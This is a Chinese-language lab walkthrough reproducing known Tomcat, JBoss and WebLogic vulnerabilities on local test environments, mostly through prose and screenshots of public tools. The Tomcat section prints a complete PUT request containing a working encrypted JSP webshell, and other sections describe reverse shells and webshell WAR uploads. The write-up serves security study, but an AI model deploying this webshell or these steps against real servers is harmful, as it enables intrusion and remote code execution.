
- [0x01 tomcat](#0x01-tomcat)
- [0x02 jboss](#0x02-jboss)
- [0x03 weblogic](#0x03-weblogic)

## 0x01 tomcat
**Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）**

本漏洞由于tomcat配置readonly=false，导致我们可以通过构造请求包给服务器写文件，先搭建tomcat环境

![](..\img\中间件漏洞\2022-06-15-23-39-32.png)


bp构建请求数据包，写入webshell
```header
PUT /1.jsp/ HTTP/1.1
Host: 127.0.0.1:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
<%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
```
![](..\img\中间件漏洞\2022-06-16-00-10-44.png)


验证shell

![](..\img\中间件漏洞\2022-06-16-00-12-34.png)


## 0x02 jboss

**JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）**

搭建环境，访问http://127.0.0.1:8080/invoker/readonly，返回500状态页面，即证明存在反序列化漏洞

![](..\img\中间件漏洞\2022-06-16-01-04-25.png)


利用jexboss工具扫描反序列化漏洞

![](..\img\中间件漏洞\2022-06-16-01-12-33.png)


反弹shell到监听机

![](..\img\中间件漏洞\2022-06-16-01-13-12.png)


验证shell

![](..\img\中间件漏洞\2022-06-16-01-15-12.png)


**JBoss JMXInvokerServlet 反序列化漏洞**

搭建环境，访问http://127.0.0.1:8080/invoker/JMXInvokerServlet可以读取JMXInvokerServlet

![](..\img\中间件漏洞\2022-06-16-01-27-39.png)


利用jexboss工具扫描反序列化漏洞

![](..\img\中间件漏洞\2022-06-16-01-30-04.png)


反弹shell到监听机

![](..\img\中间件漏洞\2022-06-16-01-30-49.png)


验证shell

![](..\img\中间件漏洞\2022-06-16-01-31-30.png)


**jboss后台部署漏洞**

在JBoss主页点击Administrator Console进入管理员登录页面，登录admin/vulhub

![](..\img\中间件漏洞\2022-06-16-01-37-12.png)


点击Applications--Web Application(AWR)s--Add a new resource进入文件部署页面，此处有文件上传

![](..\img\中间件漏洞\2022-06-16-01-43-28.png)


上传含webshell的war包

![](..\img\中间件漏洞\2022-06-16-01-47-35.png)


验证shell

![](..\img\中间件漏洞\2022-06-16-01-49-51.png)

## 0x03 weblogic

**Weblogic 任意文件上传漏洞（CVE-2018-2894）**

环境启动后，访问http://127.0.0.1:7001/console进入后台登录页面，页面自动跳转到http://127.0.0.1:7001/console/login/LoginForm.jsp

![](..\img\中间件漏洞\2022-06-15-16-26-32.png)


在docker启动目录执行dockers-compose logs|findstr password查看日志中的管理员密码，管理员用户名为weblogic

![](..\img\中间件漏洞\2022-06-15-16-30-21.png)


进入后台页面后，在base_domain--高级勾选启用Web服务测试页

![](..\img\中间件漏洞\2022-06-15-16-40-04.png)


访问http://127.0.0.1:7001/ws_utc/config.do，设置Work Home Dir为/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css。访问这个目录不需要权限，方便我们getshell

![](..\img\中间件漏洞\2022-06-15-16-50-35.png)


点击安全--添加，上传jsp马，提交

![](..\img\中间件漏洞\2022-06-15-20-26-31.png)


抓包获取上传时间戳，木马位置为/ws_utc/css/config/keystore/[时间戳]_[文件名]

![](..\img\中间件漏洞\2022-06-15-20-28-14.png)


验证shell

![](..\img\中间件漏洞\2022-06-15-20-31-31.png)


**weblogic后台部署漏洞**

访问http://127.0.0.1:7001/console进入后台页面

![](..\img\中间件漏洞\2022-06-16-02-10-46.png)


同样在环境搭建目录执行docker-compose logs|findstr password获取后台密码

![](..\img\中间件漏洞\2022-06-16-02-09-47.png)


点击域结构--部署--安装进入文件上传页面

![](..\img\中间件漏洞\2022-06-16-02-19-20.png)


点击上载文件，在部署档案处传入含webshell的war包

![](..\img\中间件漏洞\2022-06-16-02-20-14.png)


上传后一直下一步到提示完成即可

![](..\img\中间件漏洞\2022-06-16-02-32-51.png)


验证shell

![](..\img\中间件漏洞\2022-06-16-02-34-22.png)


**Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）**

搭建环境

![](..\img\中间件漏洞\2022-06-16-02-47-24.png)


利用WeblogicScan工具扫描测试

![](..\img\中间件漏洞\2022-06-16-03-13-24.png)


成功扫描漏洞

![](..\img\中间件漏洞\2022-06-16-03-15-35.png)


利用Weblogic漏洞扫描工具测试

![](..\img\中间件漏洞\2022-06-16-03-18-08.png)


利用weblogic_exploit-1.0-SNAPSHOT-all工具测试

![](..\img\中间件漏洞\2022-06-16-03-30-39.png)
